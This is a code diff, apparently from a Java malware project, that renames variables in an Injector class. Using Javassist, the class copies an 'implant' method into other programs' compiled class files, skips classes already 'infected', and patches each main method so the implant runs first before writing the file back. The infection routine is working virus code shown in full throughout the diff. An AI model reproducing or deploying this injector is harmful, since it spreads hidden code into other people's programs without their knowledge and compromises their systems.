@@ -155,26 +155,26 @@ public class Injector {
         return readImplant(new ClassFile(classFileInputStream), sourceMethodName);
     }
 
-    private static MethodInfo readImplant(final ClassFile cf, final String sourceMethodName) throws IOException {
-        MethodInfo implantMethod = cf.getMethod(sourceMethodName);
+    private static MethodInfo readImplant(final ClassFile sourceClass, final String sourceMethodName) throws IOException {
+        MethodInfo implantMethod = sourceClass.getMethod(sourceMethodName);
 
         if (implantMethod == null) {
-            throw new IOException("Cannot find method '" + sourceMethodName + "' in " + cf.getName());
+            throw new IOException("Cannot find method '" + sourceMethodName + "' in " + sourceClass.getName());
         }
 
         return implantMethod;
     }
 
     public static boolean isInfected(final Path classFilePath, final MethodInfo implant) throws IOException {
-        final ClassFile cf = readClassFile(classFilePath);
+        final ClassFile classFile = readClassFile(classFilePath);
 
-        return cf.getMethod(implant.getName()) != null;
+        return classFile.getMethod(implant.getName()) != null;
     }
 
-    public static boolean infectTarget(final Path classFilePath, final MethodInfo implantMethod) throws IOException {
-        final ClassFile cf = readClassFile(classFilePath);
+    public static boolean infectTarget(final Path targetClassFilePath, final MethodInfo implantMethod) throws IOException {
+        final ClassFile targetClass = readClassFile(targetClassFilePath);
 
-        MethodInfo main = cf.getMethod("main");
+        MethodInfo main = targetClass.getMethod("main");
         if (main == null) {
             // Only infect classes with a main function.
             return false;
@@ -184,7 +184,7 @@ public class Injector {
         MethodInfo targetImplantMethod;
         try {
             // Construct a target method from the source (implant) method
-            ConstPool constPool = cf.getConstPool();
+            ConstPool constPool = targetClass.getConstPool();
             targetImplantMethod = new MethodInfo(constPool, implantMethod.getName(), implantMethod.getDescriptor());
             targetImplantMethod.setExceptionsAttribute(implantMethod.getExceptionsAttribute());
             HashMap<String, String> classTranslation = new HashMap<>();
@@ -199,15 +199,15 @@ public class Injector {
             targetImplantMethod.getAttributes().removeIf(Objects::isNull);  // Cringe workaround due to internal bug in Javassist
             targetImplantMethod.setCodeAttribute(copy);
 
-            cf.addMethod(targetImplantMethod);
+            targetClass.addMethod(targetImplantMethod);
         } catch (DuplicateMemberException e) {
             // Class already infected
             return false;
         }
 
         // Modify the main method of the target class to run the implant method (before its own code)
-        Bytecode newCode = new Bytecode(cf.getConstPool());
-        newCode.addInvokestatic(cf.getName(), targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
+        Bytecode newCode = new Bytecode(targetClass.getConstPool());
+        newCode.addInvokestatic(targetClass.getName(), targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
         CodeAttribute newCodeAttr = newCode.toCodeAttribute();
 
         CodeAttribute mainCode = main.getCodeAttribute();
@@ -215,10 +215,10 @@ public class Injector {
         buff.put(newCodeAttr.getCode());
         buff.put(mainCode.getCode());
 
-        CodeAttribute newCodeAttribute = new CodeAttribute(cf.getConstPool(), mainCode.getMaxStack(), mainCode.getMaxLocals(), buff.array(), mainCode.getExceptionTable());
+        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), mainCode.getMaxStack(), mainCode.getMaxLocals(), buff.array(), mainCode.getExceptionTable());
         main.setCodeAttribute(newCodeAttribute);
 
-        cf.write(new DataOutputStream(new FileOutputStream(classFilePath.toFile())));
+        targetClass.write(new DataOutputStream(new FileOutputStream(targetClassFilePath.toFile())));
 
         return true;
     }
